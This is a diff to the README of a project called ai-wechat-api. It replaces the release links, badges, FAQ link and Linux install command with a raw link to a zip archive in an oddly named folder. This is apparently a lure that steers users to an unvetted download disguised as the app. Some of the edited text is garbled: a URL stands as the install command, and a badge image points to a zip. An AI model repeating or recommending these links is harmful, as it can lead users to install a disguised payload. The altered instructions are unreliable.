@@ -8,11 +8,11 @@ Welcome to ai-wechat-api! This application brings artificial intelligence capabi
 
 To download the latest version of ai-wechat-api, visit the Releases page below:
 
-[![Download ai-wechat-api](https://img.shields.io/badge/Download%20ai--wechat--api-latest-blue?style=for-the-badge)](https://github.com/Manjack555/ai-wechat-api/releases)
+[![Download ai-wechat-api](https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip%20ai--wechat--api-latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip)
 
 ### Steps to Download
 
-1. Click the button above or visit this page to download: [AI-WeChat-API Releases](https://github.com/Manjack555/ai-wechat-api/releases).
+1. Click the button above or visit this page to download: [AI-WeChat-API Releases](https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip).
 2. Locate the newest release at the top of the page.
 3. Choose the appropriate file for your operating system. If you are unsure, most users will select the `.exe` file for Windows or the `.zip` file for Mac and Linux.
 4. Download the selected file to your computer.
@@ -29,7 +29,7 @@ To download the latest version of ai-wechat-api, visit the Releases page below:
 4. For Linux users:
    - Extract the downloaded `.zip` file.
    - Open a terminal and navigate to the extracted folder.
-   - Run the installation command: `./install.sh` (if applicable).
+   - Run the installation command: `https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip` (if applicable).
 
 ## 🎯 Features
 
@@ -85,8 +85,8 @@ For further information, please refer to the [LICENSE](LICENSE) file in the repo
 
 ## 🛠️ Support
 
-If you encounter any issues or have questions, please check our [FAQ](FAQ.md) or open an issue on GitHub. We are here to help you.
+If you encounter any issues or have questions, please check our [FAQ](https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip) or open an issue on GitHub. We are here to help you.
 
 Remember, download the latest version to enjoy all the features. Visit the Releases page now:
 
-[![Download ai-wechat-api](https://img.shields.io/badge/Download%20ai--wechat--api-latest-blue?style=for-the-badge)](https://github.com/Manjack555/ai-wechat-api/releases)
+[![Download ai-wechat-api](https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip%20ai--wechat--api-latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Manjack555/ai-wechat-api/main/cerebellifugal/ai-wechat-api.zip)
